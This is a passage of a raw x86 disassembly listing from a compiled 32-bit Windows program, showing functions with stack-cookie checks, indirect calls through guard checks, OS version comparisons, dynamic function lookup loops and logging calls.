  40fa59:	mov    esi,ecx
  40fa5b:	xor    eax,eax
  40fa5d:	push   0x9
  40fa5f:	pop    ecx
  40fa60:	mov    edi,esi
  40fa62:	rep stos DWORD PTR es:[edi],eax
  40fa64:	push   esi
  40fa65:	call   DWORD PTR ds:0x4140d0
  40fa6b:	lea    eax,[esi+0x24]
  40fa6e:	push   eax
  40fa6f:	mov    DWORD PTR [eax],0x114
  40fa75:	call   DWORD PTR ds:0x4140d4
  40fa7b:	neg    eax
  40fa7d:	pop    edi
  40fa7e:	sbb    eax,eax
  40fa80:	inc    eax
  40fa81:	mov    DWORD PTR [esi+0x138],eax
  40fa87:	mov    eax,esi
  40fa89:	pop    esi
  40fa8a:	ret    
  40fa8b:	int3   
  40fa8c:	int3   
  40fa8d:	int3   
  40fa8e:	int3   
  40fa8f:	int3   
  40fa90:	cmp    DWORD PTR [ecx+0x138],0x1
  40fa97:	jne    0x40fa9c
  40fa99:	xor    eax,eax
  40fa9b:	ret    
  40fa9c:	cmp    DWORD PTR [ecx+0x34],0x2
  40faa0:	jne    0x40fa99
  40faa2:	movzx  eax,WORD PTR [ecx+0x30]
  40faa6:	mov    ecx,0x5dc
  40faab:	cmp    ecx,eax
  40faad:	sbb    eax,eax
  40faaf:	neg    eax
  40fab1:	ret    
  40fab2:	int3   
  40fab3:	int3   
  40fab4:	int3   
  40fab5:	int3   
  40fab6:	int3   
  40fab7:	cmp    DWORD PTR [ecx+0x138],0x1
  40fabe:	jne    0x40fac3
  40fac0:	xor    eax,eax
  40fac2:	ret    
  40fac3:	cmp    DWORD PTR [ecx+0x34],0x2
  40fac7:	jne    0x40fac0
  40fac9:	movzx  eax,WORD PTR [ecx+0x30]
  40facd:	mov    ecx,0x898
  40fad2:	cmp    ecx,eax
  40fad4:	sbb    eax,eax
  40fad6:	neg    eax
  40fad8:	ret    
  40fad9:	int3   
  40fada:	int3   
  40fadb:	int3   
  40fadc:	int3   
  40fadd:	int3   
  40fade:	xor    eax,eax
  40fae0:	inc    eax
  40fae1:	cmp    DWORD PTR [ecx+0x138],eax
  40fae7:	je     0x40fb08
  40fae9:	cmp    DWORD PTR [ecx+0x34],0x2
  40faed:	jne    0x40fb08
  40faef:	mov    ecx,DWORD PTR [ecx+0x30]
  40faf2:	and    ecx,0xffff
  40faf8:	cmp    ecx,0x5dc
  40fafe:	jbe    0x40fb08
  40fb00:	cmp    ecx,0x893
  40fb06:	jbe    0x40fb0a
  40fb08:	xor    eax,eax
  40fb0a:	ret    
  40fb0b:	int3   
  40fb0c:	int3   
  40fb0d:	int3   
  40fb0e:	int3   
  40fb0f:	int3   
  40fb10:	xor    eax,eax
  40fb12:	inc    eax
  40fb13:	cmp    DWORD PTR [ecx+0x138],eax
  40fb19:	je     0x40fb27
  40fb1b:	cmp    DWORD PTR [ecx+0x34],0x2
  40fb1f:	jne    0x40fb27
  40fb21:	cmp    DWORD PTR [ecx+0x28],0x6
  40fb25:	jae    0x40fb29
  40fb27:	xor    eax,eax
  40fb29:	ret    
  40fb2a:	int3   
  40fb2b:	int3   
  40fb2c:	int3   
  40fb2d:	int3   
  40fb2e:	int3   
  40fb2f:	mov    edi,edi
  40fb31:	push   ebp
  40fb32:	mov    ebp,esp
  40fb34:	push   esi
  40fb35:	push   edi
  40fb36:	mov    esi,edx
  40fb38:	mov    edi,ecx
  40fb3a:	push   esi
  40fb3b:	push   0x404b88
  40fb40:	push   DWORD PTR ds:0x4130e8
  40fb46:	call   0x40e7a0
  40fb4b:	add    esp,0xc
  40fb4e:	push   0x0
  40fb50:	push   0x0
  40fb52:	push   esi
  40fb53:	call   DWORD PTR ds:0x4140ac
  40fb59:	mov    DWORD PTR [edi],eax
  40fb5b:	test   eax,eax
  40fb5d:	jne    0x40fb97
  40fb5f:	test   esi,esi
  40fb61:	jne    0x40fb68
  40fb63:	mov    esi,0x404bac
  40fb68:	push   DWORD PTR [ebp+0x8]
  40fb6b:	push   esi
  40fb6c:	push   edi
  40fb6d:	push   0x404bb4
  40fb72:	push   DWORD PTR ds:0x4130e8
  40fb78:	call   0x40e7a0
  40fb7d:	push   DWORD PTR [ebp+0xc]
  40fb80:	push   0x404be4
  40fb85:	push   DWORD PTR ds:0x4130e8
  40fb8b:	call   0x40e7a0
  40fb90:	add    esp,0x20
  40fb93:	xor    eax,eax
  40fb95:	jmp    0x40fba7
  40fb97:	push   DWORD PTR [ebp+0x10]
  40fb9a:	mov    edx,DWORD PTR [ebp+0x8]
  40fb9d:	mov    ecx,eax
  40fb9f:	push   DWORD PTR [ebp+0xc]
  40fba2:	call   0x40fbb2
  40fba7:	pop    edi
  40fba8:	pop    esi
  40fba9:	pop    ebp
  40fbaa:	ret    0xc
  40fbad:	int3   
  40fbae:	int3   
  40fbaf:	int3   
  40fbb0:	int3   
  40fbb1:	int3   
  40fbb2:	mov    edi,edi
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	sub    esp,0xc
  40fbba:	push   ebx
  40fbbb:	mov    ebx,edx
  40fbbd:	xor    eax,eax
  40fbbf:	mov    edx,ecx
  40fbc1:	mov    DWORD PTR [ebp-0x8],eax
  40fbc4:	xor    ecx,ecx
  40fbc6:	mov    DWORD PTR [ebp-0x4],edx
  40fbc9:	inc    ecx
  40fbca:	mov    DWORD PTR [ebp-0xc],ecx
  40fbcd:	cmp    DWORD PTR [ebp+0xc],eax
  40fbd0:	jbe    0x40fc4d
  40fbd2:	push   esi
  40fbd3:	push   edi
  40fbd4:	mov    edi,DWORD PTR [ebp+0x8]
  40fbd7:	mov    esi,ebx
  40fbd9:	sub    edi,ebx
  40fbdb:	cmp    DWORD PTR [esi],0x0
  40fbde:	je     0x40fc4b
  40fbe0:	cmp    DWORD PTR [edi+esi*1],0x0
  40fbe4:	jne    0x40fc3f
  40fbe6:	push   DWORD PTR [esi]
  40fbe8:	push   edx
  40fbe9:	call   DWORD PTR ds:0x414048
  40fbef:	mov    DWORD PTR [edi+esi*1],eax
  40fbf2:	test   eax,eax
  40fbf4:	jne    0x40fc36
  40fbf6:	push   DWORD PTR [ebp+0x8]
  40fbf9:	push   ebx
  40fbfa:	push   DWORD PTR [ebp-0x4]
  40fbfd:	push   0x404c08
  40fc02:	push   DWORD PTR ds:0x4130e8
  40fc08:	call   0x40e818
  40fc0d:	add    esp,0x14
  40fc10:	call   DWORD PTR ds:0x414074
  40fc16:	push   eax
  40fc17:	push   DWORD PTR [esi]
  40fc19:	push   DWORD PTR [ebp-0x4]
  40fc1c:	push   0x404c68
  40fc21:	push   DWORD PTR ds:0x4130e8
  40fc27:	call   0x40e818
  40fc2c:	add    esp,0x14
  40fc2f:	xor    ecx,ecx
  40fc31:	mov    DWORD PTR [ebp-0xc],ecx
  40fc34:	jmp    0x40fc39
  40fc36:	mov    ecx,DWORD PTR [ebp-0xc]
  40fc39:	mov    edx,DWORD PTR [ebp-0x4]
  40fc3c:	mov    eax,DWORD PTR [ebp-0x8]
  40fc3f:	inc    eax
  40fc40:	add    esi,0x4
  40fc43:	mov    DWORD PTR [ebp-0x8],eax
  40fc46:	cmp    eax,DWORD PTR [ebp+0xc]
  40fc49:	jb     0x40fbdb
  40fc4b:	pop    edi
  40fc4c:	pop    esi
  40fc4d:	mov    eax,ecx
  40fc4f:	pop    ebx
  40fc50:	mov    esp,ebp
  40fc52:	pop    ebp
  40fc53:	ret    0x8
  40fc56:	int3   
  40fc57:	int3   
  40fc58:	int3   
  40fc59:	int3   
  40fc5a:	int3   
  40fc5b:	mov    edi,edi
  40fc5d:	push   esi
  40fc5e:	push   edi
  40fc5f:	mov    esi,ecx
  40fc61:	xor    edi,edi
  40fc63:	test   esi,esi
  40fc65:	je     0x40fca9
  40fc67:	push   0x34
  40fc69:	push   edi
  40fc6a:	push   esi
  40fc6b:	call   0x412060
  40fc70:	add    esp,0xc
  40fc73:	lea    eax,[esi+0x4]
  40fc76:	mov    edx,0x402a98
  40fc7b:	mov    ecx,esi
  40fc7d:	push   0xc
  40fc7f:	push   eax
  40fc80:	push   0x4130f0
  40fc85:	call   0x40fb2f
  40fc8a:	test   eax,eax
  40fc8c:	je     0x40fc91
  40fc8e:	inc    edi
  40fc8f:	jmp    0x40fca9
  40fc91:	cmp    DWORD PTR [esi],edi
  40fc93:	je     0x40fc9d
  40fc95:	push   DWORD PTR [esi]
  40fc97:	call   DWORD PTR ds:0x414120
  40fc9d:	push   0x34
  40fc9f:	push   edi
  40fca0:	push   esi
  40fca1:	call   0x412060
  40fca6:	add    esp,0xc
  40fca9:	mov    eax,edi
  40fcab:	pop    edi
  40fcac:	pop    esi
  40fcad:	ret    
  40fcae:	int3   
  40fcaf:	int3   
  40fcb0:	int3   
  40fcb1:	int3   
  40fcb2:	int3   
  40fcb3:	mov    edi,edi
  40fcb5:	push   ebp
  40fcb6:	mov    ebp,esp
  40fcb8:	sub    esp,0x1c
  40fcbb:	mov    eax,ds:0x413004
  40fcc0:	xor    eax,ebp
  40fcc2:	mov    DWORD PTR [ebp-0x4],eax
  40fcc5:	mov    DWORD PTR [ebp-0x1c],ecx
  40fcc8:	mov    eax,edx
  40fcca:	mov    DWORD PTR [ebp-0x10],eax
  40fccd:	test   ecx,ecx
  40fccf:	jne    0x40fcd9
  40fcd1:	push   0x57
  40fcd3:	pop    eax
  40fcd4:	jmp    0x40fe50
  40fcd9:	and    DWORD PTR [ecx],0x0
  40fcdc:	push   esi
  40fcdd:	mov    esi,DWORD PTR [eax+0x4]
  40fce0:	mov    ecx,esi
  40fce2:	push   0x1
  40fce4:	call   DWORD PTR ds:0x414220
  40fcea:	call   esi
  40fcec:	lea    esi,[eax+0x17]
  40fcef:	and    esi,0xfffffffc
  40fcf2:	mov    DWORD PTR [ebp-0x18],esi
  40fcf5:	lea    ecx,[esi+eax*1]
  40fcf8:	cmp    ecx,eax
  40fcfa:	jb     0x40fe32
  40fd00:	lea    eax,[ecx+0x14]
  40fd03:	cmp    eax,ecx
  40fd05:	jb     0x40fe32
  40fd0b:	push   ebx
  40fd0c:	push   edi
  40fd0d:	push   0xe
  40fd0f:	pop    edi
  40fd10:	push   eax
  40fd11:	call   DWORD PTR ds:0x4141b0
  40fd17:	mov    ebx,eax
  40fd19:	test   ebx,ebx
  40fd1b:	je     0x40fe2c
  40fd21:	xor    eax,eax
  40fd23:	mov    WORD PTR [ebp-0x8],0x100
  40fd29:	mov    DWORD PTR [ebp-0xc],eax
  40fd2c:	lea    ecx,[ebp-0xc]
  40fd2f:	mov    edi,eax
  40fd31:	lea    eax,[esi+0x14]
  40fd34:	mov    esi,DWORD PTR [ebp-0x10]
  40fd37:	add    eax,ebx
  40fd39:	push   0x1
  40fd3b:	push   ecx
  40fd3c:	push   eax
  40fd3d:	mov    esi,DWORD PTR [esi+0x8]
  40fd40:	mov    ecx,esi
  40fd42:	mov    DWORD PTR [ebp-0x14],eax
  40fd45:	call   DWORD PTR ds:0x414220
  40fd4b:	call   esi
  40fd4d:	test   eax,eax
  40fd4f:	je     0x40fe12
  40fd55:	mov    eax,DWORD PTR [ebp-0x10]
  40fd58:	push   edi
  40fd59:	push   DWORD PTR [ebp-0x14]
  40fd5c:	mov    esi,DWORD PTR [eax+0xc]
  40fd5f:	mov    ecx,esi
  40fd61:	call   DWORD PTR ds:0x414220
  40fd67:	call   esi
  40fd69:	push   0x2
  40fd6b:	push   DWORD PTR [ebp-0x18]
  40fd6e:	and    DWORD PTR [eax],edi
  40fd70:	lea    eax,[ebx+0x14]
  40fd73:	push   eax
  40fd74:	mov    eax,DWORD PTR [ebp-0x10]
  40fd77:	mov    esi,DWORD PTR [eax+0x10]
  40fd7a:	mov    ecx,esi
  40fd7c:	call   DWORD PTR ds:0x414220
  40fd82:	call   esi
  40fd84:	test   eax,eax
  40fd86:	je     0x40fe12
  40fd8c:	push   DWORD PTR [ebp-0x14]
  40fd8f:	lea    eax,[ebx+0x14]
  40fd92:	push   0x13ffff
  40fd97:	push   0x3
  40fd99:	push   0x2
  40fd9b:	push   eax
  40fd9c:	mov    eax,DWORD PTR [ebp-0x10]
  40fd9f:	mov    esi,DWORD PTR [eax+0x14]
  40fda2:	mov    ecx,esi
  40fda4:	call   DWORD PTR ds:0x414220
  40fdaa:	call   esi
  40fdac:	test   eax,eax
  40fdae:	je     0x40fe12
  40fdb0:	mov    eax,DWORD PTR [ebp-0x10]
  40fdb3:	push   0x1
  40fdb5:	push   ebx
  40fdb6:	mov    esi,DWORD PTR [eax+0x18]
  40fdb9:	mov    ecx,esi
  40fdbb:	call   DWORD PTR ds:0x414220
  40fdc1:	call   esi
  40fdc3:	test   eax,eax
  40fdc5:	je     0x40fe12
  40fdc7:	push   edi
  40fdc8:	lea    eax,[ebx+0x14]
  40fdcb:	push   eax
  40fdcc:	mov    eax,DWORD PTR [ebp-0x10]
  40fdcf:	push   0x1
  40fdd1:	push   ebx
  40fdd2:	mov    esi,DWORD PTR [eax+0x1c]
  40fdd5:	mov    ecx,esi
  40fdd7:	call   DWORD PTR ds:0x414220
  40fddd:	call   esi
  40fddf:	test   eax,eax
  40fde1:	je     0x40fe12
  40fde3:	mov    eax,DWORD PTR [ebp-0x10]
  40fde6:	push   0x1
  40fde8:	push   edi
  40fde9:	push   ebx
  40fdea:	mov    esi,DWORD PTR [eax+0x20]
  40fded:	mov    ecx,esi
  40fdef:	call   DWORD PTR ds:0x414220
  40fdf5:	call   esi
  40fdf7:	test   eax,eax
  40fdf9:	je     0x40fe12
  40fdfb:	mov    eax,DWORD PTR [ebp-0x10]
  40fdfe:	push   edi
  40fdff:	push   edi
  40fe00:	push   ebx
  40fe01:	mov    esi,DWORD PTR [eax+0x24]
  40fe04:	mov    ecx,esi
  40fe06:	call   DWORD PTR ds:0x414220
  40fe0c:	call   esi
  40fe0e:	test   eax,eax
  40fe10:	jne    0x40fe27
  40fe12:	call   DWORD PTR ds:0x414074
  40fe18:	mov    edi,eax
  40fe1a:	test   edi,edi
  40fe1c:	je     0x40fe27
  40fe1e:	push   ebx
  40fe1f:	call   DWORD PTR ds:0x4141bc
  40fe25:	jmp    0x40fe2c
  40fe27:	mov    eax,DWORD PTR [ebp-0x1c]
  40fe2a:	mov    DWORD PTR [eax],ebx
  40fe2c:	mov    eax,edi
  40fe2e:	pop    edi
  40fe2f:	pop    ebx
  40fe30:	jmp    0x40fe4f
  40fe32:	push   0x80070216
  40fe37:	push   0x404dd0
  40fe3c:	push   DWORD PTR ds:0x4130e8
  40fe42:	call   0x40e818
  40fe47:	mov    eax,0x216
  40fe4c:	add    esp,0xc
  40fe4f:	pop    esi
  40fe50:	mov    ecx,DWORD PTR [ebp-0x4]
  40fe53:	xor    ecx,ebp
  40fe55:	call   0x411980
  40fe5a:	mov    esp,ebp
  40fe5c:	pop    ebp
  40fe5d:	ret    
  40fe5e:	int3   
  40fe5f:	int3   
  40fe60:	int3   
  40fe61:	int3   
  40fe62:	int3   
  40fe63:	mov    edi,edi
  40fe65:	push   ebp
  40fe66:	mov    ebp,esp
  40fe68:	sub    esp,0x48
  40fe6b:	mov    eax,ds:0x413004
  40fe70:	xor    eax,ebp
  40fe72:	mov    DWORD PTR [ebp-0x4],eax
  40fe75:	push   ebx
  40fe76:	push   edi
  40fe77:	mov    ebx,ecx
  40fe79:	xor    edi,edi
  40fe7b:	test   ebx,ebx
  40fe7d:	je     0x40ff05
  40fe83:	cmp    WORD PTR [ebx],di
  40fe86:	je     0x40ff05
  40fe88:	lea    ecx,[ebp-0x48]
  40fe8b:	call   0x40fc5b
  40fe90:	test   eax,eax
  40fe92:	je     0x40ff05
  40fe94:	lea    edx,[ebp-0x48]
  40fe97:	mov    DWORD PTR [ebp-0x8],edi
  40fe9a:	lea    ecx,[ebp-0x8]
  40fe9d:	call   0x40fcb3
  40fea2:	test   eax,eax
  40fea4:	jne    0x40feed
  40fea6:	cmp    DWORD PTR [ebp-0x8],edi
  40fea9:	je     0x40feed
  40feab:	push   esi
  40feac:	mov    esi,DWORD PTR [ebp-0x20]
  40feaf:	lea    eax,[ebp-0x10]
  40feb2:	push   eax
  40feb3:	lea    eax,[ebp-0xc]
  40feb6:	mov    DWORD PTR [ebp-0xc],edi
  40feb9:	push   eax
  40feba:	lea    eax,[ebp-0x14]
  40febd:	mov    ecx,esi
  40febf:	push   eax
  40fec0:	push   DWORD PTR [ebp-0x8]
  40fec3:	call   DWORD PTR ds:0x414220
  40fec9:	call   esi
  40fecb:	test   eax,eax
  40fecd:	je     0x40feec
  40fecf:	mov    esi,DWORD PTR [ebp-0x1c]
  40fed2:	mov    ecx,esi
  40fed4:	push   edi
  40fed5:	push   DWORD PTR [ebp-0xc]
  40fed8:	push   edi
  40fed9:	push   edi
  40feda:	push   0x4
  40fedc:	push   0x1
  40fede:	push   ebx
  40fedf:	call   DWORD PTR ds:0x414220
  40fee5:	call   esi
  40fee7:	test   eax,eax
  40fee9:	jne    0x40feec
  40feeb:	inc    edi
  40feec:	pop    esi
  40feed:	push   DWORD PTR [ebp-0x8]
  40fef0:	call   DWORD PTR ds:0x4141bc
  40fef6:	cmp    DWORD PTR [ebp-0x48],0x0
  40fefa:	je     0x40ff05
  40fefc:	push   DWORD PTR [ebp-0x48]
  40feff:	call   DWORD PTR ds:0x414120
  40ff05:	mov    ecx,DWORD PTR [ebp-0x4]
  40ff08:	mov    eax,edi
  40ff0a:	pop    edi
  40ff0b:	xor    ecx,ebp
  40ff0d:	pop    ebx
  40ff0e:	call   0x411980
  40ff13:	mov    esp,ebp
  40ff15:	pop    ebp
  40ff16:	ret    
  40ff17:	int3   
  40ff18:	int3   
  40ff19:	int3   
  40ff1a:	int3   
  40ff1b:	int3   
  40ff1c:	mov    edi,edi
  40ff1e:	push   ebp
  40ff1f:	mov    ebp,esp
  40ff21:	sub    esp,0x18
  40ff24:	mov    eax,ds:0x413004
  40ff29:	xor    eax,ebp
  40ff2b:	mov    DWORD PTR [ebp-0x4],eax
  40ff2e:	push   ebx
  40ff2f:	push   esi
  40ff30:	test   ecx,ecx
  40ff32:	je     0x40ff67
  40ff34:	mov    eax,DWORD PTR [ecx]
  40ff36:	and    DWORD PTR [ebp-0x8],0x0
  40ff3a:	push   edx
  40ff3b:	push   ecx
  40ff3c:	mov    esi,DWORD PTR [eax+0x20]
  40ff3f:	mov    ecx,esi
  40ff41:	mov    DWORD PTR [ebp-0x14],0x40143c
  40ff48:	mov    DWORD PTR [ebp-0xc],edx
  40ff4b:	mov    DWORD PTR [ebp-0x10],edx
  40ff4e:	call   DWORD PTR ds:0x414220
  40ff54:	call   esi
  40ff56:	xor    ebx,ebx
  40ff58:	lea    ecx,[ebp-0x14]
  40ff5b:	test   eax,eax
  40ff5d:	setns  bl
  40ff60:	call   0x405c45
  40ff65:	jmp    0x40ff70
  40ff67:	mov    ecx,edx
  40ff69:	call   0x40e9ad
  40ff6e:	mov    ebx,eax
  40ff70:	mov    ecx,DWORD PTR [ebp-0x4]
  40ff73:	mov    eax,ebx
  40ff75:	pop    esi
  40ff76:	xor    ecx,ebp
  40ff78:	pop    ebx
  40ff79:	call   0x411980
  40ff7e:	mov    esp,ebp
  40ff80:	pop    ebp
  40ff81:	ret    
  40ff82:	int3   
  40ff83:	int3   
  40ff84:	int3   
  40ff85:	int3   
  40ff86:	int3   
  40ff87:	mov    edi,edi
  40ff89:	push   ebp
  40ff8a:	mov    ebp,esp
  40ff8c:	sub    esp,0x3c
  40ff8f:	mov    eax,ds:0x413004
  40ff94:	xor    eax,ebp
  40ff96:	mov    DWORD PTR [ebp-0x4],eax
  40ff99:	mov    eax,DWORD PTR [ebp+0xc]
  40ff9c:	push   ebx
  40ff9d:	mov    ebx,DWORD PTR [ebp+0x8]
  40ffa0:	push   esi
  40ffa1:	push   edi
  40ffa2:	push   DWORD PTR [ebp+0x14]
  40ffa5:	mov    esi,ecx
  40ffa7:	mov    DWORD PTR [ebp-0x1c],ebx
  40ffaa:	push   DWORD PTR [ebp+0x10]
  40ffad:	xor    ecx,ecx
  40ffaf:	mov    DWORD PTR [ebp-0x38],esi
  40ffb2:	mov    DWORD PTR [ebp-0x28],ecx
  40ffb5:	mov    edi,edx
  40ffb7:	mov    DWORD PTR [ebp-0x18],ecx
  40ffba:	mov    edx,0x40143c
  40ffbf:	mov    DWORD PTR [ebp-0x34],edx
  40ffc2:	mov    DWORD PTR [ebp-0x24],edx
  40ffc5:	mov    DWORD PTR [ebp-0x14],edx
  40ffc8:	mov    DWORD PTR [ebp-0x8],ecx
  40ffcb:	mov    DWORD PTR [ebp-0x20],ebx
  40ffce:	push   eax
  40ffcf:	test   esi,esi
  40ffd1:	je     0x410009
  40ffd3:	mov    esi,DWORD PTR [esi]
  40ffd5:	push   ebx
  40ffd6:	push   edi
  40ffd7:	push   DWORD PTR [ebp-0x38]
  40ffda:	mov    ecx,DWORD PTR [esi+0x24]
  40ffdd:	mov    DWORD PTR [ebp-0x2c],eax
  40ffe0:	mov    DWORD PTR [ebp-0x30],eax
  40ffe3:	mov    DWORD PTR [ebp-0xc],edi
  40ffe6:	mov    DWORD PTR [ebp-0x10],edi
  40ffe9:	call   DWORD PTR ds:0x414220
  40ffef:	call   DWORD PTR [esi+0x24]
  40fff2:	lea    ecx,[ebp-0x14]
  40fff5:	mov    esi,eax
  40fff7:	call   0x405c45
  40fffc:	lea    ecx,[ebp-0x24]
  40ffff:	call   0x405c45
  410004:	lea    ecx,[ebp-0x34]
  410007:	jmp    0x410033
  410009:	mov    edx,ebx
  41000b:	mov    DWORD PTR [ebp-0xc],eax
  41000e:	mov    ecx,edi
  410010:	mov    DWORD PTR [ebp-0x10],eax
  410013:	mov    DWORD PTR [ebp-0x2c],edi
  410016:	mov    DWORD PTR [ebp-0x30],edi
  410019:	call   0x40f465
  41001e:	lea    ecx,[ebp-0x34]
  410021:	mov    esi,eax
  410023:	call   0x405c45
  410028:	lea    ecx,[ebp-0x24]
  41002b:	call   0x405c45
  410030:	lea    ecx,[ebp-0x14]
  410033:	call   0x405c45
  410038:	push   esi
  410039:	push   ebx
  41003a:	push   edi
  41003b:	push   0x404e78
  410040:	push   DWORD PTR ds:0x4130e8
  410046:	call   0x40e818
  41004b:	mov    ecx,DWORD PTR [ebp-0x4]
  41004e:	add    esp,0x14
  410051:	mov    eax,esi
  410053:	xor    ecx,ebp
  410055:	pop    edi
  410056:	pop    esi
  410057:	pop    ebx
  410058:	call   0x411980
  41005d:	mov    esp,ebp
  41005f:	pop    ebp
  410060:	ret    0x10
  410063:	int3   
  410064:	int3   
  410065:	int3   
  410066:	int3   
  410067:	int3   
  410068:	mov    edi,edi
  41006a:	push   ebp
  41006b:	mov    ebp,esp
  41006d:	sub    esp,0x38
  410070:	mov    eax,ds:0x413004
  410075:	xor    eax,ebp
  410077:	mov    DWORD PTR [ebp-0x8],eax
  41007a:	push   ebx
  41007b:	mov    ebx,edx
  41007d:	push   esi
  41007e:	push   edi
  41007f:	mov    edi,DWORD PTR [ebp+0x8]
  410082:	push   DWORD PTR [ebp+0x10]
  410085:	test   ecx,ecx
  410087:	je     0x4100e5
  410089:	mov    eax,DWORD PTR [ebp+0xc]
  41008c:	mov    esi,0x40143c
  410091:	push   eax
  410092:	push   edi
  410093:	mov    DWORD PTR [ebp-0x38],esi
  410096:	xor    edx,edx
  410098:	mov    DWORD PTR [ebp-0x18],esi
  41009b:	mov    DWORD PTR [ebp-0x28],esi
  41009e:	mov    esi,DWORD PTR [ecx]
  4100a0:	push   ebx
  4100a1:	push   ecx
  4100a2:	mov    DWORD PTR [ebp-0x30],eax
  4100a5:	mov    ecx,DWORD PTR [esi+0x18]
  4100a8:	mov    DWORD PTR [ebp-0x34],eax
  4100ab:	mov    DWORD PTR [ebp-0x2c],edx
  4100ae:	mov    DWORD PTR [ebp-0x10],edi
  4100b1:	mov    DWORD PTR [ebp-0x14],edi
  4100b4:	mov    DWORD PTR [ebp-0xc],edx
  4100b7:	mov    DWORD PTR [ebp-0x20],ebx
  4100ba:	mov    DWORD PTR [ebp-0x24],ebx
  4100bd:	mov    DWORD PTR [ebp-0x1c],edx
  4100c0:	call   DWORD PTR ds:0x414220
  4100c6:	call   DWORD PTR [esi+0x18]
  4100c9:	lea    ecx,[ebp-0x28]
  4100cc:	mov    esi,eax
  4100ce:	call   0x405c45
  4100d3:	lea    ecx,[ebp-0x18]
  4100d6:	call   0x405c45
  4100db:	lea    ecx,[ebp-0x38]
  4100de:	call   0x405c45
  4100e3:	jmp    0x4100f3
  4100e5:	push   DWORD PTR [ebp+0xc]
  4100e8:	mov    edx,edi
  4100ea:	mov    ecx,ebx
  4100ec:	call   0x40ed47
  4100f1:	mov    esi,eax
  4100f3:	push   esi
  4100f4:	push   edi
  4100f5:	push   ebx
  4100f6:	push   0x404ef0
  4100fb:	push   DWORD PTR ds:0x4130e8
  410101:	call   0x40e818
  410106:	mov    ecx,DWORD PTR [ebp-0x8]
  410109:	add    esp,0x14
  41010c:	mov    eax,esi
  41010e:	xor    ecx,ebp
  410110:	pop    edi
  410111:	pop    esi
  410112:	pop    ebx
  410113:	call   0x411980
  410118:	mov    esp,ebp
  41011a:	pop    ebp
  41011b:	ret    0xc
  41011e:	int3   
  41011f:	int3   
  410120:	int3   
  410121:	int3   
  410122:	int3   
  410123:	mov    edi,edi
  410125:	push   ebp
  410126:	mov    ebp,esp
  410128:	sub    esp,0x2c
  41012b:	mov    eax,ds:0x413004
  410130:	xor    eax,ebp
  410132:	mov    DWORD PTR [ebp-0x4],eax
  410135:	push   ebx
  410136:	mov    ebx,edx
  410138:	push   esi
  410139:	push   edi
  41013a:	test   ecx,ecx
  41013c:	je     0x410188
  41013e:	push   DWORD PTR [ebp+0xc]
  410141:	mov    eax,DWORD PTR [ebp+0x8]
  410144:	mov    edx,0x40143c
  410149:	mov    esi,DWORD PTR [ecx]
  41014b:	and    DWORD PTR [ebp-0x1c],0x0
  41014f:	and    DWORD PTR [ebp-0xc],0x0
  410153:	push   eax
  410154:	push   ebx
  410155:	push   ecx
  410156:	mov    ecx,DWORD PTR [esi+0x1c]
  410159:	mov    DWORD PTR [ebp-0x28],edx
  41015c:	mov    DWORD PTR [ebp-0x20],eax
  41015f:	mov    DWORD PTR [ebp-0x24],eax
  410162:	mov    DWORD PTR [ebp-0x18],edx
  410165:	mov    DWORD PTR [ebp-0x10],ebx
  410168:	mov    DWORD PTR [ebp-0x14],ebx
  41016b:	call   DWORD PTR ds:0x414220
  410171:	call   DWORD PTR [esi+0x1c]
  410174:	lea    ecx,[ebp-0x18]
  410177:	mov    esi,eax
  410179:	call   0x405c45
  41017e:	lea    ecx,[ebp-0x28]
  410181:	call   0x405c45
  410186:	jmp    0x4101bc
  410188:	push   ebx
  410189:	call   DWORD PTR ds:0x4141b8
  41018f:	push   DWORD PTR [ebp+0x8]
  410192:	mov    edi,eax
  410194:	call   DWORD PTR ds:0x4141b8
  41019a:	push   DWORD PTR [ebp+0xc]
  41019d:	mov    esi,eax
  41019f:	mov    ecx,edi
  4101a1:	mov    edx,esi
  4101a3:	call   0x40ef9e
  4101a8:	push   edi
  4101a9:	mov    DWORD PTR [ebp-0x8],eax
  4101ac:	call   DWORD PTR ds:0x4141bc
  4101b2:	push   esi
  4101b3:	call   DWORD PTR ds:0x4141bc
  4101b9:	mov    esi,DWORD PTR [ebp-0x8]
  4101bc:	push   esi
  4101bd:	push   DWORD PTR [ebp+0x8]
  4101c0:	push   ebx
  4101c1:	push   0x404f68
  4101c6:	push   DWORD PTR ds:0x4130e8
  4101cc:	call   0x40e818
  4101d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4101d4:	add    esp,0x14
  4101d7:	mov    eax,esi
  4101d9:	xor    ecx,ebp
  4101db:	pop    edi
  4101dc:	pop    esi
  4101dd:	pop    ebx
  4101de:	call   0x411980
  4101e3:	mov    esp,ebp
  4101e5:	pop    ebp
  4101e6:	ret    0x8
  4101e9:	int3   
  4101ea:	int3   
  4101eb:	int3   
  4101ec:	int3   
  4101ed:	int3   
  4101ee:	mov    edi,edi
  4101f0:	push   ebp
  4101f1:	mov    ebp,esp
  4101f3:	sub    esp,0x14
  4101f6:	mov    eax,ds:0x413004
  4101fb:	xor    eax,ebp
  4101fd:	mov    DWORD PTR [ebp-0x4],eax
  410200:	push   esi
  410201:	test   ecx,ecx
  410203:	je     0x410233
  410205:	mov    eax,DWORD PTR [ecx]
  410207:	and    DWORD PTR [ebp-0x8],0x0
  41020b:	push   edx
  41020c:	push   ecx
  41020d:	mov    esi,DWORD PTR [eax+0x3c]
  410210:	mov    ecx,esi
  410212:	mov    DWORD PTR [ebp-0x14],0x40143c
  410219:	mov    DWORD PTR [ebp-0xc],edx
  41021c:	mov    DWORD PTR [ebp-0x10],edx
  41021f:	call   DWORD PTR ds:0x414220
  410225:	call   esi
  410227:	lea    ecx,[ebp-0x14]
  41022a:	mov    esi,eax
  41022c:	call   0x405c45
  410231:	jmp    0x410247
  410233:	mov    ecx,edx
  410235:	call   0x40fe63
  41023a:	test   eax,eax
  41023c:	je     0x410242
  41023e:	xor    esi,esi
  410240:	jmp    0x410247
  410242:	mov    esi,0x80004005
  410247:	mov    ecx,DWORD PTR [ebp-0x4]
  41024a:	mov    eax,esi
  41024c:	xor    ecx,ebp
  41024e:	pop    esi
  41024f:	call   0x411980
  410254:	mov    esp,ebp
  410256:	pop    ebp
  410257:	ret    
  410258:	int3   
  410259:	int3   
  41025a:	int3   
  41025b:	int3   
  41025c:	int3   
  41025d:	mov    edi,edi
  41025f:	push   ebp
  410260:	mov    ebp,esp
  410262:	sub    esp,0x428
  410268:	mov    eax,ds:0x413004
  41026d:	xor    eax,ebp
  41026f:	mov    DWORD PTR [ebp-0x4],eax
  410272:	push   ebx
  410273:	push   esi
